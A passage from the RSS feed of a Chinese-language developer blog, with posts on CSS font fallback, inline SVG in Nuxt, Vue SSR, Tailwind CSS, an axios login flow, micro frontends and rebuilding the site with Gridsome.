            <p>最近有一个需求，所有英文字母和数字使用 <code>Roboto</code> 字体，其他文字使用 <code>Hiragino Sans</code> 字体。</p><p>由于我 CSS 并不算好，本以为很难，所以 Google 了一下，查到了 <a class="tc-tiddlylink-external" href="https://keqingrong.github.io/blog/2019-11-30-different-fonts-in-different-locales" rel="noopener noreferrer" target="_blank">https://keqingrong.github.io/blog/2019-11-30-different-fonts-in-different-locales</a></p><p>然后一顿操作猛如虎，实现了。自以为是、得意扬扬地翘起了小尾巴。</p><p>不过，我也觉得奇怪。这个需求很常见啊，应该大家都会遇到啊，为啥没听其他开发者提到过 <code>unicode-range</code> 呢？</p><p>然后我又查了一些资料，最后从 <a class="tc-tiddlylink-external" href="https://www.zhangxinxu.com/wordpress/2016/11/css-unicode-range-character-font-face/" rel="noopener noreferrer" target="_blank">张鑫旭的 blog</a> 中找到了原因。原来我们根本就不需要使用 unicode-range 就可以实现上面需求。</p><p><img src="https://i.gyazo.com/9e822752680e749f318dcb9306a718c7.png"></p><p>直接把英文字体放在中文字体前面就可以了。
</p><p>看完张鑫旭的这篇blog，我骄傲的小尾巴也落下来了。😂</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Tue, 12 January 2021 15:27:14 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-01-12–qi-shi-ni-bu-xu-yao-unicode-range</guid>      
   </item>

   <item>
      <title>2021-01-11 《图形思考》图解展现你的逻辑思考能力</title>
      <link>https://thaddeusjiang.com/2021-01-11—tu-xing-si-kao–tu-jie-zhan-xian-ni-de-luo-ji-si-kao-nen-li</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-01-11 《图形思考》图解展现你的逻辑思考能力</h1>
            <hr>

            <p>这本书很简单，但非常实用。其实我自己每次看到利用图解分析问题的内容都很喜欢。图真的很容易理解。</p><p>图解展现你的逻辑思考能力，书中分享了七种基本的图：交换图、金字塔图、流程图、重叠图、树状图、深挖图、比较图。</p><p><img src="https://i.gyazo.com/178c9a8ab9f6c9763192f19a497247bb.jpg"></p><p>关于图的应用场景和思考方式，书中讲的很清楚，分享几个我的意外收获。</p><ol><li>做读书笔记是，不要以全书为对象，要尽量聚焦一些发人深省且日后会对自己有帮助的段落上。</li><li>画图会帮助我们更深刻地理解内容，这比只用马克笔标记要更有效果。</li><li>一般来说，新的想法都是既有想法的组合，而生成组合的最佳工具就是图形。用图形来发散思维吧，say goodbye to 脑图。</li></ol>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 30 June 2021 18:1:59 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-01-11—tu-xing-si-kao–tu-jie-zhan-xian-ni-de-luo-ji-si-kao-nen-li</guid>      
   </item>

   <item>
      <title>2020-09-09 Inline SVG vs Icon Fonts</title>
      <link>https://thaddeusjiang.com/2020-09-09-inline-svg-vs-icon-fonts</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-09-09 Inline SVG vs Icon Fonts</h1>
            <hr>

            <p>背景</p><p>最近几个项目都是公司内部项目，icon 都是使用免费的第三方资源。通常是 iconfont。</p><p>最新的项目是一个红酒电商系统，为了迎合红酒的高端气质，设计团队设计了很多好看的 icon。</p><p>使用自定义 icon 迫使我重新思考了如何使用 icon。</p><p>选择</p><p>选项：</p><ul><li>Inline SVG</li><li>Icon Font</li></ul><p>我参考了《Inline SVG vs Icon Fonts [CAGEMATCH] | CSS Tricks》</p><p>结论是 Inline SVG 胜出。</p><p>下面分享一下，Nuxt 中使用 Inline SVG</p><p>我们项目使用 Nuxt 框架，进而使用 <code>nuxtjs/svg</code> 基本配置和代码</p><pre class="sh hljs"><code>$ yarn add --dev nuxtjs/svg</code></pre><pre class="js hljs"><code><span class="hljs-comment">// nuxt.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">buildModules</span>: [<span class="hljs-string">"@nuxtjs/svg"</span>],
};</code></pre><pre class="html hljs"><code><span class="hljs-comment">&lt;!-- vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">NuxtLogo</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// *.svg?line 是关键</span>
  <span class="hljs-keyword">import</span> NuxtLogo <span class="hljs-keyword">from</span> <span class="hljs-string">"~/assets/nuxt.svg?inline"</span>;

  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-attr">components</span>: { NuxtLogo },
  };
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><pre class="html hljs"><code><span class="hljs-comment">&lt;!-- output --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">path</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">path</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></code></pre><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://css-tricks.com/icon-fonts-vs-svg/" rel="noopener noreferrer" target="_blank">https://css-tricks.com/icon-fonts-vs-svg/</a></li><li><a class="tc-tiddlylink-external" href="https://github.com/nuxt-community/svg-module" rel="noopener noreferrer" target="_blank">https://github.com/nuxt-community/svg-module</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 21:35:46 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-09-09-inline-svg-vs-icon-fonts</guid>      
   </item>

   <item>
      <title>2020-07-30 Vue.js SSR Note</title>
      <link>https://thaddeusjiang.com/2020-07-30-vue-js-ssr-note</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-07-30 Vue.js SSR Note</h1>
            <hr>

            <p>作为前端开发者 3 年了，第一次认真学习 SSR。</p><blockquote class="tc-quote tc-big-quote"><p>SSR 本质上是渲染应用程序的“快照”
</p></blockquote><p>因为，第一次做 C 端产品。日本最大红酒电商系统，对页面初始化要求特别高。</p><h1 class="">为什么 SSR 可以提高页面初始化速度？</h1><p>SPA，浏览器需要请求 JS，解析 JS，并渲染页面，再执行 JS 请求数据。</p><p>SSR，浏览器请求页面，服务器请求数据（Data），然后将 Data 和 JS 直接组合到 HTML，一次性返回给浏览器。浏览器接到页面可以直接渲染最终结果。</p><h1 class="">SSR 优势、劣势</h1><h2 class="">优势</h2><ul><li>更好的 SEO。因为爬虫爬到的页面已经包含数据</li><li>更快的内容到达时间 (time-to-content) 。</li></ul><p>如果是 server 也是 JS 技术栈，还有一个优势就是代码共享。</p><h2 class="">劣势</h2><ul><li>浏览器特定代码需要特定处理</li><li>需要渲染服务器</li><li>更多的服务器负载</li></ul><p>Vue SSR 劣势（Virtual-DOM JS framework），因为每个请求都是一个独立的实例，大量占用 CPU 资源。</p><h1 class="">预渲染 vs 服务器端渲染（Prerendering vs SSR）</h1><p>只是用来改善少数营销页面（例如 /, /about, /contact 等）的 SEO，那么你可能需要预渲染。
在构建时 (build time) 简单地生成针对特定路由的静态 HTML 文件。</p><h1 class="">哪些需要注意的细节？</h1><ol><li>编写通用代码。注意浏览器特定代码。（window、document 以及 第三方 library）</li><li>生命周期。只有 beforeCreate 和 created 可以用。</li><li>有副作用的代码只能在 beforeMount 和 mounted 中。</li><li>明确服务端的数据请求和客户端的数据请求。</li><li>可能需要缓存策略。绝大多数情况，页面级别缓存就足够了。</li><li>数据的响应式是多余的。及 <code>data() {}</code> 中设置初始值是多余的。</li></ol><h1 class="">将数据存在 Vuex 中</h1><blockquote class="tc-quote tc-big-quote"><p>SSR 本质上是渲染应用程序的“快照”
</p></blockquote><p>所以如果应用程序依赖异步数据，在开始渲染之前，需要先预期并解析好这些数据。</p><pre class="js hljs"><code><span class="hljs-comment">// store/modules/foo.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">namespaced</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-comment">// 重要信息：state 必须是一个函数，</span>
  <span class="hljs-comment">// 因此可以创建多个实例化该模块</span>
  <span class="hljs-attr">state</span>: <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> ({
    <span class="hljs-attr">items</span>: {}
  }),
  <span class="hljs-attr">actions</span>: {
      fetchItem ({ commit }, id) {
        <span class="hljs-comment">// `store.dispatch()` 会返回 Promise，</span>
        <span class="hljs-comment">// 以便我们能够知道数据在何时更新</span>
        <span class="hljs-keyword">return</span> fetchItem(id).then(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
          commit(<span class="hljs-string">'setItem'</span>, { id, item })
        })
      }
    },
    <span class="hljs-attr">mutations</span>: {
      setItem (state, { id, item }) {
        Vue.set(state.items, id, item)
      }
    }
}
</code></pre><p>何时，何地执行 <code>dispatch action</code> ？
合理的做法是在路由组件上放置数据。
Nuxt 有 <code>asyncData</code> 或 <code>fetch</code> 函数。</p><pre class="js hljs"><code>&lt;!-- Item.vue --&gt;
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{{ item.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  asyncData ({ store, route }) {
    <span class="hljs-comment">// 触发 action 后，会返回 Promise</span>
    <span class="hljs-keyword">return</span> store.dispatch(<span class="hljs-string">'fetchItem'</span>, route.params.id)
  },
  <span class="hljs-attr">computed</span>: {
    <span class="hljs-comment">// 从 store 的 state 对象中的获取 item。</span>
    item () {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.$store.state.items[<span class="hljs-keyword">this</span>.$route.params.id]
    }
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre><h1 class="">SSR 不全是服务器端渲染，也有一部分是浏览器渲染的</h1><p>vue 通过 <code>data-server-rendered</code> 属性识别哪些 HTML 是服务器渲染的。</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span> <span class="hljs-attr">data-server-rendered</span>=<span class="hljs-string">"true"</span>&gt;</span></code></pre><p>因为每个请求都需要一个全新的 Vue 实例，Code Splitting 还是不能少</p><pre class="js hljs"><code><span class="hljs-keyword">const</span> Foo = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'./Foo.vue'</span>)</code></pre><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://ssr.vuejs.org/" rel="noopener noreferrer" target="_blank">https://ssr.vuejs.org/</a></li><li><a class="tc-tiddlylink-external" href="https://ssr.vuejs.org/zh/guide/hydration.html#一些需要注意的坑" rel="noopener noreferrer" target="_blank">https://ssr.vuejs.org/zh/guide/hydration.html#一些需要注意的坑</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 21:39:37 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-07-30-vue-js-ssr-note</guid>      
   </item>

   <item>
      <title>2020-07-21 Why Tailwind CSS</title>
      <link>https://thaddeusjiang.com/2020-07-21-why-tailwind-css</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-07-21 Why Tailwind CSS</h1>
            <hr>

            <p>在 Twitter 上有一个讨论很有意思。</p>Undefined widget 'twitter'<blockquote class="tc-quote tc-big-quote"><p>为什么在 class 中组合 CSS，而不直接写 CSS？
</p></blockquote><p>其实最开始发现 Tailwind CSS 火起来的时候，我也有相同的疑问。</p><p>经过一段时间的使用，我慢慢地明白了为什么 Tailwind CSS 为什么选择这种方式？</p><p>TL;DR</p><ol><li>作用范围适中，且易于组合</li><li>更小的 CSS bundle</li><li>统一的实现减少了 bug</li></ol><h2 class="">1. 作用范围适中，且易于组合</h2><p>对于我而言，
编写 CSS 就像使用汇编语言开发程序，
Tailwind CSS 则让我使用了“高级语言”，不需要再过度专注语法细节了。</p><p>命名清晰的 class 组合起来非常容易，且简单易懂。即使没有 CSS 基础也可以轻松组合出期待的 UI。
的确，对于熟练使用 CSS 的开发者来说，Tailwind CSS 提供的 class 增加了记忆成本。
但是，对于并不熟练 CSS 的开发者来说，CSS 的记忆成本更高。
并且，CSS 粒度过细，开发量非常大。</p><h2 class="">2. 更小的 CSS bundle</h2><p>这是一个意外的收获，我也是偶然发现的。
例如：为了风格统一，我们需要在绝大多数标签上使用圆角。</p><p>使用 Tailwind CSS 开发，只需要一个 class</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"rounded"</span> /&gt;</span></code></pre><p>一般的 CSS 开发方式，需要三个 class</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"button"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"image"</span> /&gt;</span>


<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;
}

<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;
}

<span class="hljs-selector-class">.images</span> {
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></code></pre><p>Tailwind CSS 顺便减少的 CSS 文件大小。</p><h2 class="">3. 统一的实现减少了 bug</h2><p>还以圆角为例，大家有没有在项目中看到过下面代码？</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;
}

<span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5</span>;
}

<span class="hljs-selector-class">.images</span> {
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">1rem</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></code></pre><p>说出来有点不好意思，这样的代码，我经常遇到。
虽然 code review 时我会给出修改意见，但是这类代码从未减少。🤷‍♂️</p><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://tailwindcss.com/" rel="noopener noreferrer" target="_blank">https://tailwindcss.com/</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 23:26:14 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-07-21-why-tailwind-css</guid>      
   </item>

   <item>
      <title>2020-07-07 Frontend handle Authorization</title>
      <link>https://thaddeusjiang.com/2020-07-07-frontend-handle-authorization</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-07-07 Frontend handle Authorization</h1>
            <hr>

            <h2 class="">分享一个简单登录认证实现</h2><p>我使用 [Axios](<a class="tc-tiddlylink-external" href="https://github.com/axios/axios" rel="noopener noreferrer" target="_blank">https://github.com/axios/axios</a>) 作为 HTTP client。</p><h2 class="">原则</h2><ol><li>不创建 axios 实例，仅使用 global axios</li><li>避免在 UI 层写认证逻辑</li></ol><h2 class="">步骤</h2><p>1. 从 localStorage 中读取 token，并设置到 header 中</p><pre class="js hljs"><code>axios.defaults.headers.common[<span class="hljs-string">'Any-Token-Key'</span>] = localStorage.getItem(<span class="hljs-string">'any-token-key'</span>)</code></pre><p>2. 拦截 response，处理 <code>401 Unauthorized</code> 错误。</p><pre class="js hljs"><code>axios.interceptors.response
  .use(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-keyword">return</span> response
  },
  <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) </span>{
    <span class="hljs-keyword">if</span> (error.response.status === <span class="hljs-number">401</span>) {
      router.go(<span class="hljs-string">'/login'</span>)
    }
  })</code></pre><p>3. 编写 login 逻辑</p><pre class="js hljs"><code><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> login = <span class="hljs-keyword">async</span> ({user, password}) =&gt; {
  <span class="hljs-keyword">const</span> { data } = <span class="hljs-keyword">await</span> axios.post(<span class="hljs-string">'/login'</span>, {user, password})
  <span class="hljs-keyword">const</span> { token } = data

  localStorage.setItem(<span class="hljs-string">'any-token-key'</span>, token)
  axios.defaults.headers.common[<span class="hljs-string">'Any-Token-Key'</span>] = token
}</code></pre><h2 class="">一点点小感悟</h2><p>前端登录认证是一个基础到不能再基础的功能，可是我发现不少号称有几年开发经验的程序员还是写不出来。</p><p>虽然不知道具体原因，但是我推测可能有一下原因</p><ol><li>没有参与过新项目的开发，所以没有接触过登录认证模块。</li><li>绝大多数公司在面试时不会问这种基础的问题，所以一门心思扑在“高大上”的算法和源码。</li><li>没有阅读过其他项目的登录认证代码，只了解目前项目的逻辑。</li></ol><p>其实，日常工作中没那么多造火箭的的工作，算法和源码理解虽然很重要，但是基本的代码能力也是必不可少的。</p><p>来面试的同学/前辈们一上来就谈 Vue/React 源码，设计思想，中台实现，吧啦吧啦的，给人一种没有实际开发经验的感觉。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 23:24:37 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-07-07-frontend-handle-authorization</guid>      
   </item>

   <item>
      <title>2020-06-25 Micro frontends 2: A demo made with single-spa</title>
      <link>https://thaddeusjiang.com/2020-06-25-micro-frontends-2–a-demo-made-with-single-spa</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-06-25 Micro frontends 2: A demo made with single-spa</h1>
            <hr>

            <p>介绍了 Micro Frontends 的理论，估计大家还是云里雾里的。</p><p>我们用一个实例来展示一下 Micro Frontends 的威力。</p><h2 class="">A demo made with single-spa</h2><p><iframe height="600px" src="https://mf-dog.netlify.app/" width="100%"></iframe></p><p>这是一个非常简单的应用，只有一个菜单和两个页面。
通常情况下，对于如此简单的应用，我们通常不需要考虑什么架构问题。
不过为了演示效果嘛。</p><h2 class="">使用了哪些 library？</h2><p>基本的 library 有 3 个</p><ol><li>[single-spa](<a class="tc-tiddlylink-external" href="https://github.com/single-spa/single-spa" rel="noopener noreferrer" target="_blank">https://github.com/single-spa/single-spa</a>)</li><li>[systemjs](<a class="tc-tiddlylink-external" href="https://github.com/systemjs/systemjs" rel="noopener noreferrer" target="_blank">https://github.com/systemjs/systemjs</a>)</li><li>[import-map-overrides](<a class="tc-tiddlylink-external" href="https://github.com/joeldenning/import-map-overrides/" rel="noopener noreferrer" target="_blank">https://github.com/joeldenning/import-map-overrides/</a>)</li></ol><p>大家可以猜一下，这个应用一共有几个 repository ？</p><p>答案：4</p><p>为什么需要 4 个 repository 呢？它们有什么作用？</p><ol><li>使用 single-spa 实现 MicroFrontends，我们需要一个 config app 用来管理全部 app 的状态。</li><li>我们有 2 个页面，我们把分别独立成 app。</li><li>公共组件和主题也独立成 app。</li></ol><p>我们一共使用了 4 个 app，为了 CI/CD 方便，我们使用了 4 个 repository。
当然，你也可以使用 monorepo 管理。</p><h2 class="">这难道不是更复杂了吗？</h2><p>对于如此简单的应用，Micro frontends 确实没有必要。
但是，Micro frontends 的场景并不是简单应用，而是庞大且错中复杂的企业级应用。
可能很多人来自互联网公司，主要开发 toC 产品，没有 toB 系统开发经历。</p><p>我简单介绍一个我参与的一个 toB 产品的背景，如下：</p><pre><code>XXX 系统
2020 年启动，第一版计划 2022 年上线。
业务模块 100+
参与开发人员 50+
上线后，继续添加功能</code></pre><p>请问这样的项目有什么问题？</p><ol><li>开发周期长，2020 年流行的技术可能 2022 年已经是落后的技术了。</li><li>参与人数众多，如果不能清晰的划分业务模块的话，实际开发过程中会出现大量冲突，影响进度。</li><li>持续添加功能，为了减少回归测试工作量，隔离是必须的。</li></ol><p>综上所述，</p><blockquote class="tc-quote tc-big-quote"><p>Micro frontends 更适合 toB 场景。
</p></blockquote>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 23:20:31 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-06-25-micro-frontends-2–a-demo-made-with-single-spa</guid>      
   </item>

   <item>
      <title>2020-06-18 Micro frontends 1: What is Micro frontends</title>
      <link>https://thaddeusjiang.com/2020-06-18-micro-frontends-1–what-is-micro-frontends</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-06-18 Micro frontends 1: What is Micro frontends</h1>
            <hr>

            <h2 class="">什么是 Micro frontends？</h2><p>第一次听说 Micro frontends 是在 ThoughtWorks Radars。
简单的说，Micro frontends 就是 Micro Services 在前端的应用。</p><h2 class="">为什么我们需要 Micro frontends？</h2><p>随着技术和市场需求的发展，我们的应用程序已经变得越来越大了。从很早以前服务端工程师就发现可以通过拆分 Micro services 来减少模块间耦合，降低开发和维护难度。
所以出现了如下架构：</p><p><img src="https://i.gyazo.com/63b6e63f4e430c7d90f598c122d03338.png"></p><p>我们注意上图的最右边，Database 和 Backend 已经成功将代码拆分成微服务，但是 Frontend 还是一个大而统一的系统。</p><p>形成这种现状有很多原因，具体就不讨论了。
不过，鉴于服务端微服务的的成功实践，前端工程师们也意识到前端的微服务架构也势在必行。
简单列举几个原因：</p><ol><li>微服务可以减少模块间耦合，降低开发和维护难度。</li><li>微服务更容易进行任务分配，并行开发，提高生产效率。</li><li>感谢浏览器的不断进化，即使前端拆分成微服务，也能提供 SPA 的用户体验。</li></ol><h2 class="">为什么 Micro frontends 没有 Micro Services 流行？</h2><p>原因有很多，简单总结：</p><ol><li>Frontend 项目大体上可分为 site 和 system 两种，site 数量巨大，但功能简单，并不需要微服务架构。system 数量少，且大部分属于内部系统，不对外公开，所以影响力较低。</li><li>Micro Services 理论出现更早，项目实践更多。</li><li>Frontend 开发者中初级程序员更多，架构知识薄弱。</li></ol><h2 class="">什么样的项目适合 Micro frontends？</h2><ol><li>大型，复杂系统。如 XXX 管理系统，一个系统集成了很多模块。</li><li>对 UI 更新要求不高的系统。</li><li>标准服务，可重复利用的模块。</li></ol><p>refs:</p><ul><li><a class="tc-tiddlylink-external" href="https://www.thoughtworks.com/radar/techniques/micro-frontends" rel="noopener noreferrer" target="_blank">https://www.thoughtworks.com/radar/techniques/micro-frontends</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 23:17:19 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-06-18-micro-frontends-1–what-is-micro-frontends</guid>      
   </item>

   <item>
      <title>2020-05-30 Why I choose Gridsome to rebuild my site</title>
      <link>https://thaddeusjiang.com/2020-05-30-why-i-choose-gridsome-to-rebuild-my-site</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2020-05-30 Why I choose Gridsome to rebuild my site</h1>
            <hr>

            <p>作为一个 web developer，我特别讨厌自己不断被新技术诱惑的职业病。</p><p>我都快记不得这是第几次重写个人网站了，简直是一错再错。</p><p>不管怎么样，我还是决定重写一遍。</p><p>原因如下：</p><ol><li>2020年1月，我换了新工作。在新公司中，我的主要技术栈从 React.js 换成了 Vue.js。由于工作中使用 Vue.js 更多，个人网站切换到 Vue.js 技术栈也算是理所当然吧。</li><li>我的个人网站完全可以是静态的。Vue.js 生态中静态网站工具有 Vuepress，Nuxt，Gridsome 等，我都尝试了一下，Vuepress 过度依赖 markdown 文件系统，Nuxt 对静态网站不够专注，经过对比我选择了 Gridsome。</li><li>最后一点，Gridsome 官方提供的 blog starer 配色还不错，我很喜欢。</li></ol><p>最后，希望自己今后能更多专注到 <code>能力成长</code>，而不仅仅是<code>技能成长</code>。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Wed, 27 January 2021 23:15:18 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2020-05-30-why-i-choose-gridsome-to-rebuild-my-site</guid>      
   </item>

   <item>
      <title>2020-05-19 What is boilerplate code?</title>
      <link>https://thaddeusjiang.com/2020-05-19-what-is-boilerplate-code-</link>
